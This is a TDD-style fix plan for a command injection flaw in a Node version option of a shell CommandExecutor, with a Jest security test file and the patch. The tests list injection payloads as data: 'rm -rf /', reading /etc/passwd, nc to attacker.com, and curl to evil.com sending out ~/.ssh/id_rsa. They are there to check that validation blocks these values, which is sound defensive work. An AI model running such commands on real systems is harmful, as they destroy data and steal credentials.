# Step 2: Fix CommandExecutor Injection Point

**Status:** ✅ Complete

## Purpose

Apply nodeVersion validation at the critical injection point in CommandExecutor.executeInternal() (line 92) to prevent command injection before shell command construction. This directly eliminates the HIGH severity vulnerability.

## Prerequisites

- [ ] Step 1 completed (validateNodeVersion() function exists and tested)
- [ ] All Step 1 tests passing
- [ ] Understanding of CommandExecutor flow (lines 80-109)

## Tests to Write First

### Integration Security Tests (All in `tests/core/shell/commandExecutor.security.test.ts`)

**Security Tests:**

- [ ] **Test:** CommandExecutor blocks semicolon injection
  - **Given:** execute() called with useNodeVersion = "20; rm -rf /"
  - **When:** Command is constructed
  - **Then:** Error thrown before spawn() is called
  - **File:** `tests/core/shell/commandExecutor.security.test.ts`

- [ ] **Test:** CommandExecutor blocks ampersand injection
  - **Given:** execute() called with useNodeVersion = "20 && cat /etc/passwd"
  - **When:** Command is constructed
  - **Then:** Error thrown before spawn() is called
  - **File:** `tests/core/shell/commandExecutor.security.test.ts`

- [ ] **Test:** CommandExecutor blocks pipe injection
  - **Given:** execute() called with useNodeVersion = "20 | nc attacker.com"
  - **When:** Command is constructed
  - **Then:** Error thrown before spawn() is called
  - **File:** `tests/core/shell/commandExecutor.security.test.ts`

- [ ] **Test:** CommandExecutor blocks all injection payloads
  - **Given:** execute() called with 9 injection payloads
  - **When:** Command is constructed
  - **Then:** All throw errors before spawn()
  - **File:** `tests/core/shell/commandExecutor.security.test.ts`

**Happy Path Tests:**

- [ ] **Test:** CommandExecutor accepts valid numeric version
  - **Given:** execute() called with useNodeVersion = "20"
  - **When:** Command is constructed
  - **Then:** Validation passes, command executes
  - **File:** `tests/core/shell/commandExecutor.security.test.ts`

- [ ] **Test:** CommandExecutor accepts valid semver
  - **Given:** execute() called with useNodeVersion = "20.11.0"
  - **When:** Command is constructed
  - **Then:** Validation passes, command executes
  - **File:** `tests/core/shell/commandExecutor.security.test.ts`

- [ ] **Test:** CommandExecutor accepts "auto" keyword
  - **Given:** execute() called with useNodeVersion = "auto"
  - **When:** findAdobeCLINodeVersion() returns "20"
  - **Then:** Validation passes for returned version, command executes
  - **File:** `tests/core/shell/commandExecutor.security.test.ts`

- [ ] **Test:** CommandExecutor accepts "current" keyword
  - **Given:** execute() called with useNodeVersion = "current"
  - **When:** Command is constructed
  - **Then:** Validation skipped (uses fnm env), command executes
  - **File:** `tests/core/shell/commandExecutor.security.test.ts`

- [ ] **Test:** CommandExecutor skips validation for null
  - **Given:** execute() called with useNodeVersion = null
  - **When:** Command is constructed
  - **Then:** No version management, validation skipped
  - **File:** `tests/core/shell/commandExecutor.security.test.ts`

- [ ] **Test:** CommandExecutor skips validation for undefined
  - **Given:** execute() called without useNodeVersion option
  - **When:** Command is constructed
  - **Then:** No version management, validation skipped
  - **File:** `tests/core/shell/commandExecutor.security.test.ts`

## Files to Create/Modify

- [ ] `tests/core/shell/commandExecutor.security.test.ts` - Create new integration test file (~200 lines)
- [ ] `src/core/shell/commandExecutor.ts` - Add validation at line 92 (~3 lines)

## Implementation Details

### RED Phase (Write Failing Tests First)

**Step 2.1: Create security integration test file**

```typescript
// tests/core/shell/commandExecutor.security.test.ts
/**
 * CommandExecutor Security Tests - Command Injection Prevention
 *
 * Integration tests for nodeVersion validation in CommandExecutor:
 * - Validates that injection payloads are blocked BEFORE command execution
 * - Ensures valid versions pass through without issues
 * - Tests the complete flow from execute() to spawn()
 *
 * Target Coverage: 100% for validation code paths
 */

import { CommandExecutor } from '@/core/shell/commandExecutor';
import { spawn } from 'child_process';
import type { ChildProcess } from 'child_process';
import { EventEmitter } from 'events';

// Mock dependencies
jest.mock('child_process');
jest.mock('@/core/logging/debugLogger', () => ({
    getLogger: () => ({
        error: jest.fn(),
        debug: jest.fn(),
        info: jest.fn(),
        warn: jest.fn()
    })
}));

// Mock all CommandExecutor dependencies
jest.mock('@/core/shell/commandSequencer');
jest.mock('@/core/shell/environmentSetup');
jest.mock('@/core/shell/fileWatcher');
jest.mock('@/core/shell/pollingService');
jest.mock('@/core/shell/resourceLocker');
jest.mock('@/core/shell/retryStrategyManager');

// Helper to create mock child process
function createMockChildProcess(): ChildProcess {
    const mockChild = new EventEmitter() as any;
    mockChild.stdout = new EventEmitter();
    mockChild.stderr = new EventEmitter();
    mockChild.stdin = { write: jest.fn(), end: jest.fn() };
    mockChild.killed = false;
    mockChild.pid = 12345;
    return mockChild;
}

describe('CommandExecutor - Security (nodeVersion validation)', () => {
    let commandExecutor: CommandExecutor;
    let mockEnvironmentSetup: any;

    beforeEach(() => {
        jest.clearAllMocks();

        // Setup mock implementations
        const { ResourceLocker } = require('@/core/shell/resourceLocker');
        (ResourceLocker as jest.MockedClass<any>).mockImplementation(() => ({
            executeExclusive: jest.fn(<T>(_resource: string, operation: () => Promise<T>) => operation()),
            clearAllLocks: jest.fn()
        }));

        const { RetryStrategyManager } = require('@/core/shell/retryStrategyManager');
        (RetryStrategyManager as jest.MockedClass<any>).mockImplementation(() => ({
            executeWithRetry: jest.fn((executeFn: () => Promise<any>) => executeFn()),
            getDefaultStrategy: jest.fn(() => ({
                maxAttempts: 1,
                initialDelay: 1000,
                maxDelay: 5000,
                backoffFactor: 2
            })),
            getStrategy: jest.fn(() => ({
                maxAttempts: 1,
                initialDelay: 1000,
                maxDelay: 5000,
                backoffFactor: 1.5
            }))
        }));

        const { EnvironmentSetup } = require('@/core/shell/environmentSetup');
        mockEnvironmentSetup = {
            findAdobeCLINodeVersion: jest.fn().mockResolvedValue('20'),
            findFnmPath: jest.fn().mockReturnValue('/usr/local/bin/fnm'),
            findNpmGlobalPaths: jest.fn().mockReturnValue([]),
            ensureAdobeCLIConfigured: jest.fn().mockResolvedValue(undefined),
            ensureAdobeCLINodeVersion: jest.fn().mockResolvedValue(undefined),
            resetSession: jest.fn()
        };
        (EnvironmentSetup as jest.MockedClass<any>).mockImplementation(() => mockEnvironmentSetup);

        const { FileWatcher } = require('@/core/shell/fileWatcher');
        (FileWatcher as jest.MockedClass<any>).mockImplementation(() => ({
            disposeAll: jest.fn(),
            waitForFileSystem: jest.fn()
        }));

        const { CommandSequencer } = require('@/core/shell/commandSequencer');
        (CommandSequencer as jest.MockedClass<any>).mockImplementation(() => ({
            executeSequence: jest.fn(),
            executeParallel: jest.fn()
        }));

        const { PollingService } = require('@/core/shell/pollingService');
        (PollingService as jest.MockedClass<any>).mockImplementation(() => ({
            pollUntilCondition: jest.fn()
        }));

        commandExecutor = new CommandExecutor();
    });

    describe('command injection attacks - CRITICAL SECURITY', () => {
        describe('semicolon injection', () => {
            it('should block semicolon command separator before spawn', async () => {
                const promise = commandExecutor.execute('npm install', {
                    useNodeVersion: '20; rm -rf /'
                });

                await expect(promise).rejects.toThrow(/Invalid Node version/);

                // Verify spawn was NEVER called (command blocked before construction)
                expect(spawn).not.toHaveBeenCalled();
            });
        });

        describe('ampersand injection', () => {
            it('should block double ampersand (&&) before spawn', async () => {
                const promise = commandExecutor.execute('npm install', {
                    useNodeVersion: '20 && cat /etc/passwd'
                });

                await expect(promise).rejects.toThrow(/Invalid Node version/);
                expect(spawn).not.toHaveBeenCalled();
            });

            it('should block single ampersand (&) before spawn', async () => {
                const promise = commandExecutor.execute('npm install', {
                    useNodeVersion: '20 & curl http://evil.com'
                });

                await expect(promise).rejects.toThrow(/Invalid Node version/);
                expect(spawn).not.toHaveBeenCalled();
            });
        });

        describe('pipe injection', () => {
            it('should block pipe operator before spawn', async () => {
                const promise = commandExecutor.execute('npm install', {
                    useNodeVersion: '20 | nc attacker.com 1234'
                });

                await expect(promise).rejects.toThrow(/Invalid Node version/);
                expect(spawn).not.toHaveBeenCalled();
            });
        });

        describe('comprehensive payload coverage', () => {
            it('should block all 9 injection payloads before spawn', async () => {
                const injectionPayloads = [
                    '20; rm -rf /',
                    '20 && cat /etc/passwd',
                    '20 | nc attacker.com 1234',
                    '20`whoami`',
                    '20$(id)',
                    "20' OR '1'='1",
                    '20\nrm -rf /',
                    '20;$(curl evil.com)',
                    '20 & curl http://evil.com/exfil?data=$(cat ~/.ssh/id_rsa)',
                ];

                for (const payload of injectionPayloads) {
                    const promise = commandExecutor.execute('npm install', {
                        useNodeVersion: payload
                    });

                    await expect(promise).rejects.toThrow(/Invalid Node version/);
                }

                // Verify spawn was NEVER called for any payload
                expect(spawn).not.toHaveBeenCalled();
            });
        });
    });

    describe('valid versions - happy path', () => {
        describe('numeric major versions', () => {
            it('should accept valid numeric version', async () => {
                const mockChild = createMockChildProcess();
                (spawn as jest.Mock).mockReturnValue(mockChild);

                const promise = commandExecutor.execute('npm install', {
                    useNodeVersion: '20'
                });

                // Simulate successful execution
                mockChild.stdout!.emit('data', Buffer.from('installed\n'));
                mockChild.emit('close', 0);

                const result = await promise;

                expect(result.code).toBe(0);
                // Verify spawn WAS called (validation passed)
                expect(spawn).toHaveBeenCalled();
            });

            it('should accept all known numeric versions', async () => {
                const mockChild = createMockChildProcess();
                (spawn as jest.Mock).mockReturnValue(mockChild);

                const versions = ['18', '20', '22', '24'];

                for (const version of versions) {
                    jest.clearAllMocks();
                    (spawn as jest.Mock).mockReturnValue(mockChild);

                    const promise = commandExecutor.execute('npm install', {
                        useNodeVersion: version
                    });

                    mockChild.stdout!.emit('data', Buffer.from('installed\n'));
                    mockChild.emit('close', 0);

                    await promise;

                    expect(spawn).toHaveBeenCalled();
                }
            });
        });

        describe('semantic versions', () => {
            it('should accept valid semantic version', async () => {
                const mockChild = createMockChildProcess();
                (spawn as jest.Mock).mockReturnValue(mockChild);

                const promise = commandExecutor.execute('npm install', {
                    useNodeVersion: '20.11.0'
                });

                mockChild.stdout!.emit('data', Buffer.from('installed\n'));
                mockChild.emit('close', 0);

                const result = await promise;

                expect(result.code).toBe(0);
                expect(spawn).toHaveBeenCalled();
            });
        });

        describe('special keywords', () => {
            it('should accept "auto" keyword (validates resolved version)', async () => {
                const mockChild = createMockChildProcess();
                (spawn as jest.Mock).mockReturnValue(mockChild);

                // Mock findAdobeCLINodeVersion to return "20"
                mockEnvironmentSetup.findAdobeCLINodeVersion.mockResolvedValue('20');

                const promise = commandExecutor.execute('npm install', {
                    useNodeVersion: 'auto'
                });

                mockChild.stdout!.emit('data', Buffer.from('installed\n'));
                mockChild.emit('close', 0);

                const result = await promise;

                expect(result.code).toBe(0);
                expect(spawn).toHaveBeenCalled();
                expect(mockEnvironmentSetup.findAdobeCLINodeVersion).toHaveBeenCalled();
            });

            it('should accept "current" keyword (skips validation)', async () => {
                const mockChild = createMockChildProcess();
                (spawn as jest.Mock).mockReturnValue(mockChild);

                const promise = commandExecutor.execute('npm install', {
                    useNodeVersion: 'current'
                });

                mockChild.stdout!.emit('data', Buffer.from('installed\n'));
                mockChild.emit('close', 0);

                const result = await promise;

                expect(result.code).toBe(0);
                expect(spawn).toHaveBeenCalled();
            });
        });

        describe('null and undefined handling', () => {
            it('should skip validation for null (no version management)', async () => {
                const mockChild = createMockChildProcess();
                (spawn as jest.Mock).mockReturnValue(mockChild);

                const promise = commandExecutor.execute('npm install', {
                    useNodeVersion: null
                });

                mockChild.stdout!.emit('data', Buffer.from('installed\n'));
                mockChild.emit('close', 0);

                const result = await promise;

                expect(result.code).toBe(0);
                expect(spawn).toHaveBeenCalled();
            });

            it('should skip validation for undefined (default behavior)', async () => {
                const mockChild = createMockChildProcess();
                (spawn as jest.Mock).mockReturnValue(mockChild);

                const promise = commandExecutor.execute('npm install');
                // useNodeVersion not specified (undefined)

                mockChild.stdout!.emit('data', Buffer.from('installed\n'));
                mockChild.emit('close', 0);

                const result = await promise;

                expect(result.code).toBe(0);
                expect(spawn).toHaveBeenCalled();
            });
        });
    });
});
```

**Step 2.2: Run tests to confirm they fail**

```bash
npm test -- tests/core/shell/commandExecutor.security.test.ts
```

Expected: All tests fail (validation not yet added to CommandExecutor).

### GREEN Phase (Minimal Implementation to Pass Tests)

**Step 2.3: Add validation to CommandExecutor**

Modify `src/core/shell/commandExecutor.ts` around line 92:

```typescript
// BEFORE (vulnerable):
if (options.useNodeVersion !== null && options.useNodeVersion !== undefined) {
    const nodeVersion = options.useNodeVersion === 'auto'
        ? await this.environmentSetup.findAdobeCLINodeVersion()
        : options.useNodeVersion;

    if (nodeVersion) {
        // ... (line 96-108)
    }
}

// AFTER (secure):
// Add import at top of file:
import { validateNodeVersion } from '@/core/validation/securityValidation';

// Modify line 91-96:
if (options.useNodeVersion !== null && options.useNodeVersion !== undefined) {
    // SECURITY: Validate nodeVersion BEFORE resolving "auto"
    validateNodeVersion(options.useNodeVersion);

    const nodeVersion = options.useNodeVersion === 'auto'
        ? await this.environmentSetup.findAdobeCLINodeVersion()
        : options.useNodeVersion;

    // SECURITY: Validate resolved version from findAdobeCLINodeVersion()
    // (in case "auto" resolves to something unexpected)
    if (nodeVersion && nodeVersion !== 'current') {
        validateNodeVersion(nodeVersion);
    }

    if (nodeVersion) {
        // Use fnm exec for guaranteed isolation
        const fnmPath = this.environmentSetup.findFnmPath();
        if (fnmPath && nodeVersion !== 'current') {
            // fnm exec provides bulletproof isolation - no fallback to nvm/system Node
            finalCommand = `${fnmPath} exec --using=${nodeVersion} ${finalCommand}`;
            finalOptions.shell = finalOptions.shell || '/bin/zsh';
        } else if (nodeVersion === 'current') {
            // Use fnm env for current version
            finalCommand = `eval "$(fnm env)" && ${finalCommand}`;
            finalOptions.shell = finalOptions.shell || '/bin/zsh';
        }
    }
}
```

**Exact code to add** (at line 92-93):

```typescript
// Step 2: Handle Node version management
// Fix #7 (01b94d6): Use fnm exec for bulletproof isolation instead of fnm use
if (options.useNodeVersion !== null && options.useNodeVersion !== undefined) {
    // SECURITY FIX: Validate nodeVersion BEFORE resolving "auto" (CWE-77: Command Injection Prevention)
    validateNodeVersion(options.useNodeVersion);

    const nodeVersion = options.useNodeVersion === 'auto'
        ? await this.environmentSetup.findAdobeCLINodeVersion()
        : options.useNodeVersion;

    // SECURITY FIX: Validate resolved version (in case "auto" resolves to unexpected value)
    if (nodeVersion && nodeVersion !== 'current') {
        validateNodeVersion(nodeVersion);
    }

    if (nodeVersion) {
        // ... rest of existing code
    }
}
```

**Step 2.4: Add import at top of file**

After existing imports, around line 10:

```typescript
import { validateNodeVersion } from '@/core/validation/securityValidation';
```

**Step 2.5: Run tests to confirm they pass**

```bash
npm test -- tests/core/shell/commandExecutor.security.test.ts
```

Expected: All security tests pass.

### REFACTOR Phase (Improve Quality While Keeping Tests Green)

**Step 2.6: Improve code quality**

1. **Add security comments:**
   - Document WHY validation is critical (prevents CWE-77)
   - Reference the vulnerability being fixed
   - Explain double validation (user input + resolved version)

2. **Verify validation placement:**
   - Validate BEFORE command construction (earliest possible point)
   - Validate user input AND resolved "auto" value
   - Skip validation for "current" (uses fnm env, not interpolated)

3. **Check error handling:**
   - validateNodeVersion() throws descriptive errors
   - Errors propagate to caller (not caught silently)
   - User sees helpful error message

**Step 2.7: Re-run all CommandExecutor tests**

```bash
npm test -- tests/core/shell/commandExecutor.test.ts
npm test -- tests/core/shell/commandExecutor.security.test.ts
```

Expected: All tests pass (no regressions in existing tests).

**Step 2.8: Verify no spawn() calls on invalid input**

Review test output to confirm:
- spawn() is NEVER called when validation fails
- Errors are thrown BEFORE command construction
- Valid versions pass through without issues

## Expected Outcome

- **Validation added** at CommandExecutor.ts line 92-93 (3 lines total)
- **Import added** for validateNodeVersion at top of file
- **Integration tests passing** demonstrating:
  - All 9 injection payloads blocked
  - All valid formats accepted
  - No spawn() calls on invalid input
- **No regressions** in existing CommandExecutor tests
- **100% coverage** for new validation code paths

## Acceptance Criteria

- [ ] validateNodeVersion() called at line 92 (before resolving "auto")
- [ ] validateNodeVersion() called again for resolved version (if not "current")
- [ ] Import added for validateNodeVersion at top of file
- [ ] All 9 injection payloads blocked before spawn()
- [ ] All valid formats (numeric, semver, keywords, null, undefined) accepted
- [ ] spawn() NEVER called when validation fails
- [ ] All CommandExecutor tests passing (no regressions)
- [ ] Security comments added explaining fix
- [ ] Code follows existing CommandExecutor patterns

## Estimated Time

**1.0 hours**

- RED Phase: 30 minutes (write integration security tests)
- GREEN Phase: 15 minutes (add 3 lines of validation code)
- REFACTOR Phase: 10 minutes (improve comments, verify no regressions)
- Verification: 5 minutes (run full test suite)

---

**Next Step:** Step 3 - Validate at ComponentRegistryManager Source
